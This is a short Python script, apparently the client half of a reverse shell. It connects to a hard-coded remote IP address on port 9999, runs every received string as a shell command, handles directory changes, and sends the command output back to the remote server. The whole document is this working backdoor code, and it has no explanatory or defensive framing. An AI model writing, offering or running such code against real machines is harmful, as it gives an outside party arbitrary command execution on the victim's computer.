import socket
import os
import subprocess

host="157.245.84.191"  # digital ocean (connection-new) project IP Address
port=9999
s=socket.socket()

s.connect((host,port))

while True:
    data=s.recv(1024)
    if data[:2].decode("utf-8")=="cd":
        os.chdir(data[3:].decode("utf-8"))

    if len(data)>0:
        cmd=subprocess.Popen(data[:].decode("utf-8"),shell=True,stdout=subprocess.PIPE,stdin=subprocess.PIPE,stderr=subprocess.PIPE)
        output_byte=cmd.stdout.read() + cmd.stderr.read()  # this gives byte output and error too
        output_str=str(output_byte,"utf-8") # convert into string
        currentWD=os.getcwd()+">"  #current word directory (process location)
        s.send(str.encode(output_str+currentWD))  # send it to server

        print(output_str) # print the output into the client computer

